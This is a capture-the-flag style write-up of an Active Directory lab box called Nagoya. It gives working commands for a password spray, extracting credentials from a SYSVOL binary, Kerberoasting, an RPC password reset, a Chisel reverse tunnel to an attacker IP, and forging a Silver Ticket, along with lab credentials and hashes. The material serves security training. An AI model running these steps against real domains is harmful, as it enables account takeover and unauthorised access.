#Windows #ActiveDirectory #PasswordSpray #Kerberoast #strings #RPC #PasswordReset #SilverTicket #Chisel #Tunneling

## Overview

Nagoya is a multi-stage Active Directory box that chains credential discovery from a SYSVOL binary, Kerberoasting, RPC-based password reset of a domain user, port-forwarding to reach internal MSSQL, and finally a Silver Ticket attack to impersonate Administrator against the SQL service. The foothold begins with a username list harvested from the company website and a password spray against SMB. Each step requires moving to a different protocol or privilege level, making this an exercise in methodical AD enumeration rather than a single exploit.

> **Note:** the notes document the Silver Ticket construction and ccache export but cut off before the final MSSQL access with the Administrator ticket and root flag retrieval. Written as in-progress from that point.

## Recon

### Nmap

```sh
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
139/tcp  open  netbios-ssn
389/tcp  open  ldap              Domain: nagoya-industries.com
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

Domain: `nagoya-industries.com`. Added to `/etc/hosts`.

### Web Enumeration, Employee Harvesting

The IIS site had a `/team` page listing 28 employees by first and last name. GoBuster found nothing else of interest beyond `/error`, which leaked an ASP.NET Core development-mode message.

Formatted into a `firstname.lastname` username list (28 entries) and saved as `names.txt`.

## Foothold

### Password Spray Against SMB

The list of `firstname.lastname` usernames was sprayed against SMB using rockyou:

```sh
nxc smb 192.168.190.21 -u names.txt -p /usr/share/wordlists/rockyou.txt
```

One match:

```sh
[+] nagoya-industries.com\Fiona.Clark:Summer2023
```

### SYSVOL Binary, Credential Extraction with `strings -e l`

With Fiona's credentials, the SMB shares were listed. SYSVOL contained a `Password Reset` directory with a binary called `ResetPassword.exe`. Running standard `strings` against the binary produced little, the strings were encoded in UTF-16LE (wide characters), which `strings` skips by default.

The `-e l` flag forces little-endian 16-bit string decoding:

```sh
strings -e l ResetPassword.exe
```

Within the output:

```sh
Password reset successful.
svc_helpdesk
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

> **Why `strings -e l` matters on Windows binaries:** Windows natively uses UTF-16LE for string literals in many compiled applications. The default `strings` command only extracts ASCII and misses wide strings entirely. The `-e l` flag decodes 16-bit little-endian characters, surfacing credentials, URLs, and config values that standard `strings` would blank out. On Windows targets, always run both.

Credentials so far:

```
Fiona.Clark : Summer2023
svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

## Kerberoasting

Both accounts were used to request Kerberoastable tickets:

```sh
impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' \
  -dc-ip 192.168.214.21 -debug -outputfile kerb.txt
```

Two hashes returned, one for `svc_helpdesk` (already owned) and one for `svc_mssql`. John cracked the `svc_mssql` ticket almost immediately:

```sh
john kerb.txt
Service1         (svc_mssql)
```

Credentials:

```
svc_mssql : ‹redacted›
```

## Privilege Escalation

### RPC Password Reset → Evil-WinRM as christopher.lewis

Neither Evil-WinRM nor LDAP worked with any discovered account. External MSSQL (1433) was also unreachable. The next angle was RPC enumeration as `svc_helpdesk`, since helpdesk accounts often have `setuserinfo` rights over regular users.

```sh
rpcclient -U nagoya-industries/svc_helpdesk 192.168.214.21
```

Enumeration revealed user `christopher.lewis` (RID 0x46c) was a member of `developers` and `employees` groups. Attempting to reset his password:

```sh
rpcclient $> setuserinfo christopher.lewis 23 'Admin!23'
```

No error. Access confirmed:

```sh
evil-winrm -i 192.168.214.21 -u christopher.lewis -p 'Admin!23'
```

> **Why `setuserinfo` works from helpdesk accounts:** the `setuserinfo` RPC call (info level 23 = set password) is controlled by the `User-Force-Change-Password` extended right in Active Directory. Helpdesk service accounts are commonly granted this right on regular user OUs so they can reset passwords without going through a web portal. If no error is returned, the write succeeded, and you now own the account.

### Tunneling to Internal MSSQL with Chisel

Port 1433 was not externally reachable but was confirmed running internally:

```powershell
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> netstat -ano | Select-String "1433"
TCP    0.0.0.0:1433    0.0.0.0:0    LISTENING    2200
```

Chisel SOCKS tunnel to forward traffic through the WinRM session:

```sh
# Kali
chisel server -p 8000 --reverse

# Target
.\chisel.exe client 192.168.45.156:8000 R:socks
```

MSSQL access via proxychains:

```sh
proxychains ./mssqlclient.py svc_mssql:Service1@127.0.0.1 -windows-auth

SQL (NAGOYA-IND\svc_mssql  guest@master)> select name from master.dbo.sysdatabases;
master / tempdb / model / msdb
```

Only default databases. `xp_cmdshell` was denied, the account lacked `sysadmin`.

### Silver Ticket Attack Against MSSQL

With the `svc_mssql` password known and the MSSQL SPN identified, a Silver Ticket was forged to impersonate the Administrator (RID 500) against the SQL service.

Domain SID retrieved from the WinRM session:

```powershell
Import-Module ActiveDirectory
Get-ADDomain
# S-1-5-21-1969309164-1513403977-1686805993
```

SPN for the MSSQL service:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# MSSQL/nagoya.nagoya-industries.com
```

Converting the `svc_mssql` password to its NTLM hash:

```sh
echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
# e3a0168bc21cfb88b95c954a5b18f57c
```

> **What a Silver Ticket is:** a forged Kerberos TGS (service ticket) crafted offline using the service account's NT hash. Unlike a Golden Ticket (which requires the `krbtgt` hash), a Silver Ticket only needs the target service account's hash. The ticket claims to be for any user, including Administrator, and the target service validates it using only its own key, never checking with the KDC. This bypasses domain-level monitoring entirely.

Ticket forged with impacket-ticketer:

```sh
impacket-ticketer \
  -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQL/nagoya.nagoya-industries.com \
  -user-id 500 Administrator

[*] Saving ticket in Administrator.ccache
```

Exporting the ticket:

```sh
export KRB5CCNAME=Administrator.ccache
```

## Takeaways

- **Wide-string `strings -e l` is mandatory on Windows binaries.** UTF-16LE credentials inside PE files are completely invisible to standard `strings`. One flag change surfaced a plaintext service account password.
- **Helpdesk accounts can force-reset passwords over RPC.** `setuserinfo` level 23 is a quiet, log-light way to take over domain accounts, no GUI, no ticket, just an RPC call.
- **Silver Tickets bypass the KDC entirely.** When you have a service account's NTLM hash and its SPN, you can impersonate any user against that service with no KDC interaction and no domain controller query. Network monitoring sees only local service validation.
- **Chisel SOCKS tunnels unlock internally-reachable services.** MSSQL on 1433 was invisible externally; one tunneled connection from an authenticated WinRM session made it reachable from Kali.
